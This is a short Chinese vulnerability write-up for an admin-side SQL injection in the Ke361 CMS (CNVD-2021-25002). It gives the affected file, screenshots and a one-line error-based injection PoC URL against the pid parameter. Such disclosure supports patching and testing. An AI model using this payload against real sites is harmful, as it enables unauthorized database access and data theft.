# Ke361 DistrictController.class.php 后台SQL注入漏洞 CNVD-2021-25002

## 漏洞描述

Ke361 DistrictController.class.php index() 函数 pid参数存在 SQL注入漏洞，通过漏洞可以获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>Ke361</a-checkbox></br>

## 环境搭建

<a-checkbox checked>https://gitee.com/jcove/ke361</a-checkbox></br>

## 漏洞复现

CMS产品页面

![img](../../../.vuepress/public/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232910449.png)

存在漏洞的文件为 `Application/Admin/Controller/DistrictController.class.php`

![img](../../../.vuepress/public/img/1634142045802-bdf21a65-a663-4f35-afc2-bc3e70d44309.png)

验证POC

```php
admin.php?s=/District/index/pid/1)%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
```

![img](../../../.vuepress/public/img/1634142062147-5e1703bb-91c6-44cd-8867-c3409540c2d8.png)



若有收获，就点个赞吧